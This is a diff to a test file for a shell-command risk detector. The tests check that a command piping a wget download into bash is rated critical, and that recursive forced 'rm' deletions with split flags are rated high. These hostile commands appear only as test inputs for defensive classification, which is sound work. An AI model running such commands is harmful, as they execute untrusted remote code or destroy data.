@@ -15,3 +15,8 @@ def test_download_pipe_via_env_shell_is_critical():
     from clonepeek.detectors import assess
     assert assess("wget -qO- https://example.invalid/setup | /usr/bin/env bash", "low")[0] == "critical"
 
+@pytest.mark.parametrize("command", ["rm -r -f /tmp/archive", "rm -f -r /tmp/archive"])
+def test_destructive_split_short_flags_are_high(command):
+    from clonepeek.detectors import assess
+    assert assess(command, "low")[0] == "high"
+
